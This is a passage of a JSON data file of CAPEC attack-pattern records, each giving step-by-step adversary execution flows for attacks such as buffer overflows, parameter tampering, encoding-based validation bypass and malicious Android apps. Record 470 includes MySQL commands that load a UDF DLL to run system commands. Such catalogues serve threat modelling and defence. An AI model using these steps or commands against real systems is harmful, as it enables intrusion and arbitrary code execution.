        "step2": " [Authenticate to service] Authenticate to the service, if required, in order to explore it.. - Use published credentials to access system.. - Find unpublished credentails to access service.. - Use other attack pattern or weakness to bypass authentication. ",
        "step3": " [Identify all interfaces] Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.. - For any published services, determine exposed interfaces via the documentation provided.. - For any services found, use error messages from poorly formed service calls to determine valid interfaces. In some cases, services will respond to poorly formed calls with valid ones. ",
        "step4": " [Attempt to discover unpublished functions] Using manual or automated means, discover unpublished or undocumented functions exposed by the service.. - Manually attempt calls to the service using an educated guess approach, including the use of terms like' 'test', 'debug', 'delete', etc.. - Use automated tools to scan the service to attempt to reverse engineer exposed, but undocumented, features. ",
        "step5": " [Exploit unpublished functions] Using information determined via experimentation, exploit the unpublished features of the service.. - Execute features that are not intended to be used by general system users.. - Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions.\n"
    },
    {
        "id": 248,
        "capec_id": "37",
        "step1": " [Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.. - Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.. - Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack. ",
        "step2": " [Retrieve Embedded Data] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to retrieve the information of interest.. - API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.. - Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.. - Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.. - Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, they attempt decoding in that format.\n"
    },
    {
        "id": 249,
        "capec_id": "38"
    },
    {
        "id": 250,
        "capec_id": "383"
    },
    {
        "id": 251,
        "capec_id": "384"
    },
    {
        "id": 252,
        "capec_id": "385"
    },
    {
        "id": 253,
        "capec_id": "386"
    },
    {
        "id": 254,
        "capec_id": "387"
    },
    {
        "id": 255,
        "capec_id": "388"
    },
    {
        "id": 256,
        "capec_id": "389"
    },
    {
        "id": 257,
        "capec_id": "39",
        "step1": " [Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisions. - Use WebScarab to reveal hidden fields while browsing.. - Use a sniffer to capture packets. - View source of web page to find hidden fields. - Examine URL to see if any opaque tokens are in it. - Disassemble or decompile client-side application. - Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc. ",
        "step2": " [Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.. - Look for signs of well-known character encodings. - Look for cryptographic signatures. - Look for delimiters or other indicators of structure ",
        "step3": " [Modify parameter/token values] Trying each parameter in turn, the attacker modifies the values. - Modify tokens logically. - Modify tokens arithmetically. - Modify tokens bitwise. - Modify structural components of tokens. - Modify order of parameters/tokens ",
        "step4": " [Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server. - Use network-level packet injection tools such as netcat. - Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.. - Use modified client (modified by reverse engineering). - Use debugging tools to modify data in client.\n"
    },
    {
        "id": 258,
        "capec_id": "390"
    },
    {
        "id": 259,
        "capec_id": "391"
    },
    {
        "id": 260,
        "capec_id": "392"
    },
    {
        "id": 261,
        "capec_id": "393"
    },
    {
        "id": 262,
        "capec_id": "394"
    },
    {
        "id": 263,
        "capec_id": "395"
    },
    {
        "id": 264,
        "capec_id": "396"
    },
    {
        "id": 265,
        "capec_id": "397"
    },
    {
        "id": 266,
        "capec_id": "398"
    },
    {
        "id": 267,
        "capec_id": "399"
    },
    {
        "id": 268,
        "capec_id": "4",
        "step1": " [Survey the application for IP addresses as user input] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application where IP addresses are used.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and attempts alternate IP address encodings, observing application behavior. The adversary will also attempt to access the application through an alternate IP address encoding to see if access control changes. - Instead of using a URL, use the IP address that the URL resolves to. - Specify a port directly to a URL input. - Omit or add http:// or https:// to a URL to see if the application behaves differently ",
        "step3": " [Bypass access control] Using an alternate IP address encoding, the adversary will either access the application or give the alternate encoding as input, bypassing access control restrictions.\n"
    },
    {
        "id": 269,
        "capec_id": "40",
        "step1": " [Identify attacker-writable terminals] Determine if users TTYs are writable by the attacker.. - Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.. - Attempt to write to other user TTYs. This approach could leave a trail or alert a user. ",
        "step2": " [Execute malicious commands] Using one or more vulnerable TTY, execute commands to achieve various impacts.. - Commands that allow reading or writing end user files can be executed.\n"
    },
    {
        "id": 270,
        "capec_id": "400"
    },
    {
        "id": 271,
        "capec_id": "401"
    },
    {
        "id": 272,
        "capec_id": "402"
    },
    {
        "id": 273,
        "capec_id": "404"
    },
    {
        "id": 274,
        "capec_id": "405"
    },
    {
        "id": 275,
        "capec_id": "406"
    },
    {
        "id": 276,
        "capec_id": "407"
    },
    {
        "id": 277,
        "capec_id": "408"
    },
    {
        "id": 278,
        "capec_id": "409"
    },
    {
        "id": 279,
        "capec_id": "41",
        "step1": " [Identify and characterize metacharacter-processing vulnerabilities in email headers] An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.. - Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.. - Manually tampering email headers to inject malicious metacharacter-based payload content in them. ",
        "step2": " An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.. - Send emails with specifically-constructed, metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.\n"
    },
    {
        "id": 280,
        "capec_id": "410"
    },
    {
        "id": 281,
        "capec_id": "411"
    },
    {
        "id": 282,
        "capec_id": "412"
    },
    {
        "id": 283,
        "capec_id": "413"
    },
    {
        "id": 284,
        "capec_id": "414"
    },
    {
        "id": 285,
        "capec_id": "415"
    },
    {
        "id": 286,
        "capec_id": "416"
    },
    {
        "id": 287,
        "capec_id": "417"
    },
    {
        "id": 288,
        "capec_id": "418"
    },
    {
        "id": 289,
        "capec_id": "419"
    },
    {
        "id": 290,
        "capec_id": "42",
        "step1": " [Identify target mail server] The adversary identifies a target mail server that they wish to attack.. - Use Nmap on a system to identify a mail server service. ",
        "step2": " [Determine viability of attack] Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4). ",
        "step3": " [Find injection vector] Identify places in the system where vulnerable MIME conversion routines may be used. ",
        "step4": " [Craft overflow content] The adversary crafts e-mail messages with special headers that will cause a buffer overflow for the vulnerable MIME conversion routine. The intent of this attack is to leverage the overflow for execution of arbitrary code and gain access to the mail server machine, so the adversary will craft an email that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step5": " [Overflow the buffer] Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.\n"
    },
    {
        "id": 291,
        "capec_id": "420"
    },
    {
        "id": 292,
        "capec_id": "421"
    },
    {
        "id": 293,
        "capec_id": "422"
    },
    {
        "id": 294,
        "capec_id": "423"
    },
    {
        "id": 295,
        "capec_id": "424"
    },
    {
        "id": 296,
        "capec_id": "425"
    },
    {
        "id": 297,
        "capec_id": "426"
    },
    {
        "id": 298,
        "capec_id": "427"
    },
    {
        "id": 299,
        "capec_id": "428"
    },
    {
        "id": 300,
        "capec_id": "429"
    },
    {
        "id": 301,
        "capec_id": "43",
        "step1": " [Determine application/system inputs where bypassing input validation is desired] The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where they want to bypass it.. - While using an application/system, the attacker discovers an input where validation is stopping them from performing some malicious or unauthorized actions. ",
        "step2": " [Determine which character encodings are accepted by the application/system] The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.. - Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, ''. - Determine whether URL encoding is accepted by the application/system.. - Determine whether UTF-8 encoding is accepted by the application/system.. - Determine whether UTF-16 encoding is accepted by the application/system.. - Determine if any other encodings are accepted by the application/system. ",
        "step3": " [Combine multiple encodings accepted by the application.] The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.. - Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: .. With two parsing layers, this may get converted to . after the first parsing layer, and then, to . after the second. If the input validation layer is between the two parsing layers, then .. might pass a test for .. but still get converted to .. afterwards. This may enable directory traversal attacks.. - Combine multiple encodings and observe the effects. For example, the attacker might encode . as ., and then, encode . as &#92;&#46;, and then, encode that using URL encoding to %26%2392%3B%26%2346%3B ",
        "step4": " [Leverage ability to bypass input validation] Attacker leverages their ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.. - Gain access to sensitive files.. - Perform command injection.. - Perform SQL injection.. - Perform XSS attacks.\n"
    },
    {
        "id": 302,
        "capec_id": "430"
    },
    {
        "id": 303,
        "capec_id": "431"
    },
    {
        "id": 304,
        "capec_id": "432"
    },
    {
        "id": 305,
        "capec_id": "433"
    },
    {
        "id": 306,
        "capec_id": "434"
    },
    {
        "id": 307,
        "capec_id": "435"
    },
    {
        "id": 308,
        "capec_id": "438"
    },
    {
        "id": 309,
        "capec_id": "439"
    },
    {
        "id": 310,
        "capec_id": "44",
        "step1": " [Identify target software] The adversary identifies software that uses external binary files in some way. This could be a file upload, downloading a file from a shared location, or other means. ",
        "step2": " [Find injection vector] The adversary creates a malicious binary file by altering the header to make the file seem shorter than it is. Additional bytes are added to the end of the file to be placed in the overflowed location. The adversary then deploys the file to the software to determine if a buffer overflow was successful. ",
        "step3": " [Craft overflow content] Once the adversary has determined that this attack is viable, they will specially craft the binary file in a way that achieves the desired behavior. If the source code is available, the adversary can carefully craft the malicious file so that the return address is overwritten to an intended value. If the source code is not available, the adversary will iteratively alter the file in order to overwrite the return address correctly.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] Once the adversary has constructed a file that will effectively overflow the targeted software in the intended way. The file is deployed to the software, either by serving it directly to the software or placing it in a shared location for a victim to load into the software.\n"
    },
    {
        "id": 311,
        "capec_id": "440"
    },
    {
        "id": 312,
        "capec_id": "441"
    },
    {
        "id": 313,
        "capec_id": "442"
    },
    {
        "id": 314,
        "capec_id": "443"
    },
    {
        "id": 315,
        "capec_id": "444"
    },
    {
        "id": 316,
        "capec_id": "445"
    },
    {
        "id": 317,
        "capec_id": "446"
    },
    {
        "id": 318,
        "capec_id": "447"
    },
    {
        "id": 319,
        "capec_id": "448"
    },
    {
        "id": 320,
        "capec_id": "449"
    },
    {
        "id": 321,
        "capec_id": "45",
        "step1": " [Identify target application] The adversary identifies a target application or program that might load in certain files to memory. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - The adversary creates or modifies a symbolic link pointing to those files which contain an excessive amount of data. If creating a symbolic link to one of those files causes different behavior in the application, then an injection vector has been identified. ",
        "step3": " [Craft overflow file content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] Using the specially crafted file content, the adversary creates a symbolic link from the identified resource to the malicious file, causing a targeted buffer overflow attack.\n"
    },
    {
        "id": 322,
        "capec_id": "450"
    },
    {
        "id": 323,
        "capec_id": "451"
    },
    {
        "id": 324,
        "capec_id": "452"
    },
    {
        "id": 325,
        "capec_id": "453"
    },
    {
        "id": 326,
        "capec_id": "454"
    },
    {
        "id": 327,
        "capec_id": "455"
    },
    {
        "id": 328,
        "capec_id": "456"
    },
    {
        "id": 329,
        "capec_id": "457",
        "step1": " [Determine Target System] In certain cases, the adversary will explore an organization's network to determine a specific target machine to exploit based on the information it contains or privileges the main user may possess.. - If needed, the adversary explores an organization's network to determine if any specific systems of interest exist. ",
        "step2": " [Develop or Obtain malware and install on a USB device] The adversary develops or obtains the malicious software necessary to exploit the target system, which they then install on an external USB device such as a USB flash drive.. - The adversary can develop or obtain malware for to perform a variety of tasks such as sniffing network traffic or monitoring keystrokes. ",
        "step3": " [Connect or deceive a user into connecting the infected USB device] Once the malware has been placed on an external USB device, the adversary connects the device to the target system or deceives a user into connecting the device to the target system such as in a USB Drop Attack.. - The adversary connects the USB device to a specified target system or performs a USB Drop Attack, hoping a user will find and connect the USB device on their own. Once the device is connected, the malware executes giving the adversary access to network traffic, credentials, etc.\n"
    },
    {
        "id": 330,
        "capec_id": "458"
    },
    {
        "id": 331,
        "capec_id": "459",
        "step1": " [Craft Certificates] The adversary crafts two different, but valid X.509 certificates that when hashed with an insufficiently collision resistant hashing algorithm would yield the same value. ",
        "step2": " [Send CSR to Certificate Authority] The adversary sends the CSR for one of the certificates to the Certification Authority which uses the targeted hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key. ",
        "step3": " [Insert Signed Blob into Unsigned Certificate] The adversary takes the signed blob and inserts it into the second X.509 certificate that the attacker generated. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob is valid in the second certificate. The result is two certificates that appear to be signed by a valid certificate authority despite only one having been signed.\n"
    },
    {
        "id": 332,
        "capec_id": "46",
        "step1": " [Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries look for applications or programs that accept formatted files, such as configuration files, as input. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - Knowing the type of file that an application takes as input, the adversary takes a normal input file and modifies a single variable or tag to contain a large amount of data. If there is a crash, this means that a buffer overflow attack is possible. The adversary will keep changing single variables or tags one by one until they see a change in behavior. ",
        "step3": " [Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] The adversary will upload the crafted file to the application, causing a buffer overflow.\n"
    },
    {
        "id": 333,
        "capec_id": "460",
        "step1": " [Find User Input] The adversary finds anywhere in the web application that uses user-supplied input in a form or action. This can also be found by looking at parameters in the URL in the navigation bar of the browser ",
        "step2": " [Add Duplicate Parameter Values] Once the adversary has identified what user input is used as HTTP parameters, they will add duplicates to each parameter one by one to observe the results. If the response from the HTTP request shows the duplicate parameter value concatenated with the original parameter value in some way, or simply just the duplicate parameter value, then HPP is possible.. - In the URL, add a duplicate parameter by using the & delimiter. For example par1=val1 becomes par1=val1&par1=val2. Depending on the backend API, this could be treated as par1=val1, val2, which could lead to par1 being set to val2, ignoring val1.. - If the request is created based on user input directly on the page, the adversary will test by adding an encoded delimiter to the input. For example, the adverary might supply 1000%26action=withdraw and the backend might interpret a POST request with the paramters action=deposit&amount=1000&action=withdraw ",
        "step3": " [Leverage HPP] Once the adversary has identified how the backend handles duplicate parameters, they will leverage this by polluting the paramters in a way that benefits them. In some cases, hardcoded parameters will be disregarded by the backend. In others, the adversary can bypass a WAF that might only check a parameter before it has been concatenated by the backend, resulting in malicious queries getting through.\n"
    },
    {
        "id": 334,
        "capec_id": "461",
        "step1": " [Find a vulnerable web service] The adversary finds a web service that uses a vulnerable authentication scheme, where an authentication token is concatenated with the parameters of a request and then hashed. - Read application documentation to learn about authentication schemes being used. - Observe web service traffic to look for vulnerable authentication schemes ",
        "step2": " [Attempt adding padding to parameters] An adversary tests if they can simply add padding to the parameters of a request such that the request is technically changed, with the hash remaining the same. - Exploit the hash function extension / padding weakness with only padding to test the weakness ",
        "step3": " [Add malicious parameters to request] Add malicious parameters to a captured request in addition to what is already present. Do this by exploiting the padding weakness of the hash function and send the request to the web service so that it believes it is authenticated and acts on the extra parameters.. - Exploit the hash function extension / padding weakness by adding malicious parameters to a web service request such that it is still deemed authentic.\n"
    },
    {
        "id": 335,
        "capec_id": "462",
        "step1": " [Determine service to send cross domain requests to] The adversary first determines which service they will be sending the requests to ",
        "step2": " [Send and time various cross domain requests] Adversaries will send a variety of cross domain requests to the target, timing the time it takes for the target to respond. Although they won't be able to read the response, the adversary can use the time to infer information about what the service did upon receiving the request.. - Using a GET request, leverage the img tag in conjunction with onload() / onerror() javascript events to time a response. - Using a POST request, leverage the iframe element and use the onload() event to time a response ",
        "step3": " [Infer information from the response time] After obtaining reponse times to various requests, the adversary will compare these times and infer potentially sensitive information. An example of this could be asking a service to retrieve information and random usernames. If one request took longer to process, it is likely that a user with that username exists, which could be useful knowledge to an adversary.. - Compare timing of different requests to infer potentially sensitive information about a target service.\n"
    },
    {
        "id": 336,
        "capec_id": "463"
    },
    {
        "id": 337,
        "capec_id": "464"
    },
    {
        "id": 338,
        "capec_id": "465"
    },
    {
        "id": 339,
        "capec_id": "466"
    },
    {
        "id": 340,
        "capec_id": "467"
    },
    {
        "id": 341,
        "capec_id": "468"
    },
    {
        "id": 342,
        "capec_id": "469"
    },
    {
        "id": 343,
        "capec_id": "47",
        "step1": " [Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - In this attack, the normal method of providing large user input does not work. The program performs bounds checking on the user input, but not the expanded user input. The adversary needs to provide input that they believe will be expanded by the program to overflow a buffer. To identify where this is possible, an adversary either needs to have knowledge of the inner workings of the program or use a disassembler and other reverse engineering tools to guide the search. ",
        "step3": " [Craft overflow content] The adversary crafts the input to be given to the program. If the intent is to simply cause the software to crash, the input needs only to expand to an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft input that expands in a way that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.. - Create specific files and directories on the system and then give input using path traversal shortcuts to those directories that could expand past an input buffer. ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary gives the crafted input to the program, overflowing the buffer.\n"
    },
    {
        "id": 344,
        "capec_id": "470",
        "step1": " The adversary identifies a database management system running on a machine they would like to gain control over, or on a network they want to move laterally through. ",
        "step2": " The adversary goes about the typical steps of an SQL injection and determines if an injection is possible. ",
        "step3": " Once the Adversary determines that an SQL injection is possible, they must ensure that the requirements for the attack are met. These are a high privileged session user and batched query support. This is done in similar ways to discovering if an SQL injection is possible. ",
        "step4": " If the requirements are met, based on the database management system that is running, the adversary will find or create user defined functions (UDFs) that can be loaded as DLLs. An example of a DLL can be found at https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql ",
        "step5": " In order to load the DLL, the adversary must first find the path to the plugin directory. The command to achieve this is different based on the type of DBMS, but for MySQL, this can be achieved by running the command select @@plugin_dir ",
        "step6": " The DLL is then moved into the previously found plugin directory so that the contained functions can be loaded. This can be done in a number of ways; loading from a network share, writing the entire hex encoded string to a file in the plugin directory, or loading the DLL into a table and then into a file. An example using MySQL to load the hex string is as follows. select 0x4d5a9000... into dump file {plugin directory}udf.dll; ",
        "step7": " Once the DLL is in the plugin directory, a command is then run to load the UDFs. An example of this in MySQL is create function sys_eval returns string soname 'udf.dll'; The function sys_eval is specific to the example DLL listed above. ",
        "step8": " Once the adversary has loaded the desired function(s), they will use these to execute arbitrary commands on the compromised system. This is done through a simple select command to the loaded UDF. For example: select sys_eval('dir');. Because the prerequisite to this attack is that the database session user is a super user, this means that the adversary will be able to execute commands with elevated privileges.\n"
    },
    {
        "id": 345,
        "capec_id": "471",
        "step1": " [Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.. - The attacker uses a tool such as the OSX otool utility or manually probes whether the target application uses dynamically linked libraries.. - The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted. ",
        "step2": " [Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that they will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.. - The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application. ",
        "step3": " [Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries they crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.. - The attacker modifies the entries in the configuration files pointing to the malicious libraries they crafted.. - The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-132.. - The attacker leverages file search path order issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-38.\n"
    },
    {
        "id": 346,
        "capec_id": "472"
    },
    {
        "id": 347,
        "capec_id": "473"
    },
    {
        "id": 348,
        "capec_id": "474"
    },
    {
        "id": 349,
        "capec_id": "475"
    },
    {
        "id": 350,
        "capec_id": "476"
    },
    {
        "id": 351,
        "capec_id": "477"
    },
    {
        "id": 352,
        "capec_id": "478",
        "step1": " [Determine target system] The adversary must first determine the system they wish to modify the registry of. This needs to be a windows machine as this attack only works on the windows registry. ",
        "step2": " [Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the windows registry.. - Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.. - Gain remote access to a system through a variety of means. ",
        "step3": " [Modify windows registry] The adversary will modify the windows registry by changing the configuration settings for a service. Specifically, the adversary will change the path settings to define a path to a malicious binary to be executed.\n"
    },
    {
        "id": 353,
        "capec_id": "479"
    },
    {
        "id": 354,
        "capec_id": "48",
        "step1": " [Identify web application URL inputs] Review application inputs to find those that are designed to be URLs.. - Manually navigate web site pages to identify URLs.. - Use automated tools to identify URLs. ",
        "step2": " [Identify URL inputs allowing local access.] Execute test local commands via each URL input to determine which are successful.. - Manually execute a local command (such as 'pwd') via the URL inputs.. - Using an automated tool, test each URL input for weakness. ",
        "step3": " [Execute malicious commands] Using the identified URL inputs that allow local command execution, execute malicious commands.. - Execute local commands via the URL input.\n"
    },
    {
        "id": 355,
        "capec_id": "480",
        "step1": " [Probing] The adversary probes the target application, service, or device to find a possible weakness that would allow escaping the virtualized environment.. - Probing applications, services, or devices for virtualization weaknesses. ",
        "step2": " [Verify the exploitable security weaknesses] Using the found weakness, the adversary attempts to escape the virtualized environment.. - Using an application weakness to escape a virtualized environment ",
        "step3": " [Execute more complex attacks] Once outside of the virtualized environment, the adversary attempts to perform other more complex attacks such as accessing system resources or executing unauthorized code within the host environment.. - Executing complex attacks when given higher permissions by escaping a virtualized environment.\n"
    },
    {
        "id": 356,
        "capec_id": "481"
    },
    {
        "id": 357,
        "capec_id": "482"
    },
    {
        "id": 358,
        "capec_id": "484"
    },
    {
        "id": 359,
        "capec_id": "485"
    },
    {
        "id": 360,
        "capec_id": "486"
    },
    {
        "id": 361,
        "capec_id": "487"
    },
    {
        "id": 362,
        "capec_id": "488"
    },
    {
        "id": 363,
        "capec_id": "489"
    },
    {
        "id": 364,
        "capec_id": "49",
        "step1": " [Determine application's/system's password policy] Determine the password policies of the target application/system.. - Determine minimum and maximum allowed password lengths.. - Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).. - Determine account lockout policy (a strict account lockout policy will prevent brute force attacks). ",
        "step2": " [Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.. - Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.. - Perform an offline dictionary attack or a rainbow table attack against a known password hash.\n"
    },
    {
        "id": 365,
        "capec_id": "490"
    },
    {
        "id": 366,
        "capec_id": "491",
        "step1": " [Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using substituion on the victim's side.. - Use an automated tool to record all instances of URLs to process requests.. - Use a browser to manually explore the website and analyze how the application processes requests. ",
        "step2": " [Craft malicious payload] The adversary crafts malicious message containing nested quadratic expansion that completely uses up available server resource. ",
        "step3": " [Send the message] Send the malicious crafted message to the target URL.\n"
    },
    {
        "id": 367,
        "capec_id": "492"
    },
    {
        "id": 368,
        "capec_id": "493"
    },
    {
        "id": 369,
        "capec_id": "494"
    },
    {
        "id": 370,
        "capec_id": "495"
    },
    {
        "id": 371,
        "capec_id": "496"
    },
    {
        "id": 372,
        "capec_id": "497"
    },
    {
        "id": 373,
        "capec_id": "498"
    },
    {
        "id": 374,
        "capec_id": "499",
        "step1": " [Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents. They must also determine what the contents of the intents being sent are such that a malicious application can get sent these intents. ",
        "step2": " [Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents from a target application. - Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter ",
        "step3": " [Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary ",
        "step4": " [Intercept Implicit Intents] Once the malicious app is downloaded, the android device will forward any implicit intents from the target application to the malicious application, allowing the adversary to gaina access to the contents of the intent. The adversary can proceed with any attack using the contents of the intent.. - Block the intent from reaching the desired location, causing a denial of service. - Gather sensitive information from the intercepted intent. - Modify the contents of the intent and forward along to another application.\n"
    },
    {
        "id": 375,
        "capec_id": "5"
    },
    {
        "id": 376,
        "capec_id": "50",
        "step1": " Understand the password recovery mechanism and how it works. ",
        "step2": " Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.\n"
    },
    {
        "id": 377,
        "capec_id": "500",
        "step1": " [Determine target web application] An adversary first needs to determine what web application they wish to target.. - Target web applications that require users to enter sensitive information.. - Target web applications that an adversary wishes to operate on behalf of a logged in user. ",
        "step2": " [Create malicious application] An adversary creates an application, often mobile, that incorporates a WebView component to display the targeted web application. This malicious application needs to downloaded by a user, so adversaries will make this application useful in some way.. - Create a 3rd party application that adds useful functionality to the targeted web application. Victims will download the application as a means of using the targeted web application.. - Create a fun game that at some point directs a user to the targeted web application. For example, prompt the user to buy in game currency by directing them to PayPal. ",
        "step3": " [Get the victim to download and run the application] An adversary needs to get the victim to willingly download and run the application.. - Pay for App Store advertisements. - Promote the application on social media, either through accounts made by the adversary or by paying for other accounts to advertise. ",
        "step4": " [Inject malicious code] Once the victim runs the malicious application and views the targeted web page in the WebView component, the malicious application will inject malicious JavaScript code into the web application. This is done by using WebView's loadURL() API, which can inject arbitrary JavaScript code into pages loaded by the WebView component with the same privileges. This is often done by adding a script tag to the document body with a src destination to a remote location that serves malicious JavaScript code.. - Execute operations on the targeted web page on behalf of an authenticated user.. - Steal cookie information from the victim.. - Add in extra fields to the DOM in an attempt to get a user to divulge sensitive information.\n"
    },
    {
        "id": 378,
        "capec_id": "501",
        "step1": " [Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents to launch an Android-based trusted activity, and what that activity is. ",
        "step2": " [Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents to launch an Adroid-based trusted activity. This malicious app will mimic the trusted activiy's user interface to get the user to enter sensitive data.. - Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter ",
        "step3": " [Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary ",
        "step4": " [Gather sensitive data through malicious app] Once the target application sends an implicit intent to launch a trusted activity, the malicious app will be launched instead that looks identical to the interface of that activity. When the user enters sensitive information it will be captured by the malicious app.. - Gather login information from a user using a malicious app.\n"
    },
    {
        "id": 379,
        "capec_id": "502"
    },
    {
        "id": 380,
        "capec_id": "503"
    },
    {
        "id": 381,
        "capec_id": "504",
        "step1": " [Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing sensitive information.. - Determine what tasks prompt a user for their credentials.. - Determine what tasks may prompt a user to authorize a process to execute with elevated privileges. ",
        "step2": " [Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials or to ride the user's privileges.. - Prompt a user for their credentials, while making the user believe the credential request is legitimate.. - Prompt a user to authorize a task to run with elevated privileges, while making the user believe the request is legitimate.\n"
    },
    {
        "id": 382,
        "capec_id": "505"
    },
    {
        "id": 383,
        "capec_id": "506"
    },
    {
        "id": 384,
